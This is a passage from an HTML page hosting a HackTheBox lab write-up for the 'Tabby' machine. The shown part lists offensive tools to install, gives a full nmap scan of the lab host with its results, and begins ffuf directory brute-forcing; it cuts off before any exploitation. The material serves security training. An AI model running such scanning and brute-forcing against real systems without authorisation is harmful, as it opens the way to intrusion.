<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-writeups docs-doc-id-HackTheBox/Tabby/write-up">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.4.1">
<title data-rh="true">Tabby | CyFun</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" name="twitter:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" property="og:url" content="https://s4ch.github.io/writeups/HackTheBox/Tabby/write-up/"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="robots" content="max-image-preview:large"><meta data-rh="true" name="monetization" content="$ilp.uphold.com/fYPB8Pjyig3z"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" property="og:title" content="Tabby | CyFun"><meta data-rh="true" name="description" content="- Name: Tabby"><meta data-rh="true" property="og:description" content="- Name: Tabby"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://s4ch.github.io/writeups/HackTheBox/Tabby/write-up/"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/HackTheBox/Tabby/write-up/" hreflang="en"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/HackTheBox/Tabby/write-up/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="CyFun RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="CyFun Atom Feed">
<link rel="alternate" type="application/json" href="/blog/feed.json" title="CyFun JSON Feed">



<link rel="icon" href="/img/cy.png">
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="rgb(37, 194, 160)">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#000">
<link rel="apple-touch-icon" href="/img/cy.png">
<link rel="mask-icon" href="/img/cy.png" color="rgb(62, 204, 94)">
<meta name="msapplication-TileImage" content="/img/cy.png">
<meta name="msapplication-TileColor" content="#000"><link rel="stylesheet" href="/assets/css/styles.ff01972a.css">
<link rel="preload" href="/assets/js/runtime~main.3415e7ae.js" as="script">
<link rel="preload" href="/assets/js/main.c90fa39a.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}return t}()||function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}()</script><div id="__docusaurus">
<div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">CyFun</b></a><a class="navbar__item navbar__link" href="/blog/">Blog</a><a class="navbar__item navbar__link" href="/docs/">Threads</a><a class="navbar__item navbar__link" href="/ctf/">CTF</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/writeups/">Writeups</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/s4ch/s4ch.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently dark mode)" aria-label="Switch between dark and light mode (currently dark mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebarViewport_Xe31"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/writeups/">About</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" href="/writeups/HackTheBox/Academy/write-up/">HackTheBox</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Academy/write-up/">Academy</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Admirer/write-up/">Admirer</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Blackfield/write-up/">Blackfield</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Blunder/write-up/">Blunder</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Book/write-up/">Book</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Buff/write-up/">Buff</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Cache/write-up/">Cache</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Control/write-up/">Control</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/CyberSantaCTF/2021/write-up/">CyberSantaCTF</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Delivery/write-up/">Delivery</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Doctor/write-up/">Doctor</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Dyplesher/write-up/">Dyplesher</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Fatty/write-up/">Fatty</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ForwardSlash/write-up/">ForwardSlash</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Jewel/write-up/">Jewel</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Laboratory/write-up/">Laboratory</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Magic/write-up/">Magic</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Mango/write-up/">Mango</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Monteverde/write-up/">Monteverde</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Nest/write-up/">Nest</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Obscurity/write-up/">Obscurity</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Omni/write-up/">Omni</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Oouch/write-up/">Oouch</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/OpenAdmin/write-up/">OpenAdmin</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Passage/write-up/">Passage</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Ready/write-up/">Ready</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Remote/write-up/">Remote</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ScriptKiddie/write-up/">ScriptKiddie</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ServMon/write-up/">ServMon</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/SneakyMailer/write-up/">SneakyMailer</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" tabindex="0" href="/writeups/HackTheBox/Tabby/write-up/">Tabby</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/writeups/HackTheBox/Tabby/write-up/">Tabby </a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Tenet/write-up/">Tenet</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Traceback/write-up/">Traceback</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Travel/write-up/">Travel</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Traverxec/write-up/">Traverxec</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Worker/write-up/">Worker</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/writeups/Tryhackme/0day/">Tryhackme</a></div></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">HackTheBox</span><meta itemprop="position" content="1"></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Tabby</span><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Tabby </span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>Information</h1><ul><li><strong>Name:</strong> Tabby</li><li><strong>Profile:</strong> <a href="https://www.hackthebox.eu/home/machines/profile/259" target="_blank" rel="noopener noreferrer">www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 20</li></ul><p><img loading="lazy" alt="Tabby" src="/assets/images/tabby-a502b95c3d4c2ffe0dcaa0d68180514c.png" width="598" height="381" class="img_ev3q"></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="overview">Overview<a href="#overview" class="hash-link" aria-label="Direct link to Overview" title="Direct link to Overview">​</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ pacman -S nmap ffuf curl metasploit pwncat peass fcrackzip</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="network-enumeration">Network enumeration<a href="#network-enumeration" class="hash-link" aria-label="Direct link to Network enumeration" title="Direct link to Network enumeration">​</a></h2><p>Port and service discovery scan with <a href="https://nmap.org/" target="_blank" rel="noopener noreferrer">nmap</a>:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap 7.80 scan initiated Sat Aug  8 13:09:36 2020 as: nmap -p- -sSVC -oA nmap_full -v 10.10.10.194</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Increasing send delay for 10.10.10.194 from 0 to 5 due to 649 out of 2162 dropped probes since last increase.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap scan report for 10.10.10.194</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host is up (0.032s latency).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Not shown: 65531 closed ports</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT     STATE SERVICE VERSION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| http-methods:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  Supported Methods: GET HEAD POST OPTIONS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: Mega Hosting</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">8080/tcp open  http    Apache Tomcat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| http-methods:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  Supported Methods: OPTIONS GET HEAD POST</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-open-proxy: Proxy might be redirecting requests</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: Apache Tomcat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Read data files from: /usr/bin/../share/nmap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap done at Sat Aug  8 13:28:24 2020 -- 1 IP address (1 host up) scanned in 1127.63 seconds</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="http-enumeration">HTTP enumeration<a href="#http-enumeration" class="hash-link" aria-label="Direct link to HTTP enumeration" title="Direct link to HTTP enumeration">​</a></h2><p>Let&#x27;s start with the website on port 80 and do a bunch of directory busting
with <a href="https://github.com/ffuf/ffuf" target="_blank" rel="noopener noreferrer">ffuf</a>:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ffuf -u http://10.10.10.194/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.html,.php -fc 403</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        /&#x27;___\  /&#x27;___\           /&#x27;___\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       /\ \__/ /\ \__/  __  __  /\ \__/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">         \ \_\   \ \_\  \ \____/  \ \_\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          \/_/    \/_/   \/___/    \/_/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       v1.2.0-git</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">________________________________________________</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Method           : GET</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: URL              : http://10.10.10.194/FUZZ</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Wordlist         : FUZZ: 